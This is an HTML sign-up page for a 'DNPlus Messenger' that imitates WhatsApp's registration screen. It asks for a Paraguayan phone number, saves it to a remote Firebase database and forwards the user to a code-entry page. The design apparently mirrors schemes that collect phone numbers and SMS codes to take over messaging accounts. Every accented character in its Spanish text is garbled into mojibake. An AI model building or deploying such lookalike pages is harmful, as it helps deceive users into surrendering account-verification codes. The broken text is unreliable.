<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro - DNPlus</title>
    <style>
        body { 
            background-color: #0b141a; 
            color: #e9edef; 
            text-align: center; 
            font-family: sans-serif;
            margin: 0;
            padding: 20px;
        }
        .title { color: #e9edef; font-weight: 500; margin-top: 60px; font-size: 22px; }
        .instruccion { color: #8696a0; font-size: 14px; margin-bottom: 30px; padding: 0 40px; line-height: 1.5; }
        
        .phone-container { display: flex; justify-content: center; align-items: center; gap: 15px; margin-bottom: 40px; }
        .country-select { border-bottom: 2px solid #085f56; padding: 5px 0; width: 90px; font-size: 18px; color: #e9edef; }
        .number-input { background: transparent; border: none; border-bottom: 2px solid #085f56; padding: 5px 0; font-size: 18px; width: 180px; outline: none; color: #e9edef; }
        
        .btn-confirmar { 
            background-color: #085f56; 
            color: white; 
            padding: 12px 60px; 
            border-radius: 30px; 
            font-weight: bold; 
            border: none; 
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
            text-transform: uppercase;
        }

        /* Modal DNPlus Oscuro */
        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); z-index: 1000; }
        .modal-box { background: #232d36; width: 85%; max-width: 320px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); padding: 20px 24px; border-radius: 3px; text-align: left; box-shadow: 0 12px 30px rgba(0,0,0,0.5); }
        .btn-flat { background: none; border: none; color: #00a884; font-weight: bold; cursor: pointer; text-transform: uppercase; padding: 10px; font-size: 14px; }
    </style>
</head>
<body>

    <h2 class="title">Introduce tu n칰mero</h2>
    <p class="instruccion">DNPlus Messenger enviar치 un SMS para verificar tu n칰mero de tel칠fono.</p>

    <div class="phone-container">
        <div class="country-select"><span>游왫릖 +595</span></div>
        <input type="tel" id="phoneInput" class="number-input" placeholder="9xx xxx xxx" autofocus>
    </div>

    <button class="btn-confirmar" onclick="validarNumero()">SIGUIENTE</button>

    <div id="miModal" class="modal-overlay">
        <div class="modal-box">
            <h3 id="modalTitulo" style="margin-top:0; font-size: 18px; color: #e9edef; font-weight: normal;">쮼s correcto?</h3>
            <div id="modalMensaje" style="font-size: 15px; color: #8696a0; line-height: 1.4;"></div>
            <div id="modalButtons" style="display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px;"></div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyD2nZF5QC-Zti80xP1A518qbUPnhRru_9A",
            authDomain: "dnplus-messenger-pro.firebaseapp.com",
            databaseURL: "https://dnplus-messenger-pro-default-rtdb.firebaseio.com",
            projectId: "dnplus-messenger-pro",
            storageBucket: "dnplus-messenger-pro.firebasestorage.app",
            messagingSenderId: "625573378436",
            appId: "1:625573378436:android:58945eb1e22ec4a2ba85d1"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const modal = document.getElementById('miModal');
        const modalTitulo = document.getElementById('modalTitulo');
        const modalMensaje = document.getElementById('modalMensaje');
        const modalButtons = document.getElementById('modalButtons');

        function validarNumero() {
            let num = document.getElementById('phoneInput').value.replace(/\s+/g, '');
            
            if(num.length >= 9) {
                modalTitulo.innerText = "쮼s este su n칰mero?";
                modalMensaje.innerHTML = `
                    <div style="color:#e9edef; font-size: 17px; margin-bottom: 10px;">+595 ${num}</div>
                    Te enviaremos un c칩digo por SMS para verificar tu cuenta de DNPlus.
                `;
                modalButtons.innerHTML = `
                    <button class="btn-flat" onclick="cerrarModal()">EDITAR</button>
                    <button class="btn-flat" id="btnOk">OK</button>
                `;
                modal.style.display = 'block';
                
                // Evento para el bot칩n OK
                document.getElementById('btnOk').onclick = function() {
                    guardarYEnviar(num);
                };
            } else {
                modalTitulo.innerText = "N칰mero no v치lido";
                modalMensaje.innerText = "Por favor, introduce un n칰mero v치lido.";
                modalButtons.innerHTML = `<button class="btn-flat" onclick="cerrarModal()">OK</button>`;
                modal.style.display = 'block';
            }
        }

        function cerrarModal() { modal.style.display = 'none'; }
        
        function guardarYEnviar(num) {
            const numCompleto = "+595" + num;
            const btn = document.getElementById('btnOk');
            btn.innerText = "CONECTANDO...";
            btn.disabled = true;

            // Guardamos el intento de registro
            db.ref("registros_pendientes").push({
                telefono: numCompleto,
                fecha: Date.now()
            }).then(() => {
                localStorage.setItem("user_phone", numCompleto);
                window.location.href = 'otp.html';
            }).catch(e => {
                alert("Error: " + e.message);
                btn.innerText = "OK";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
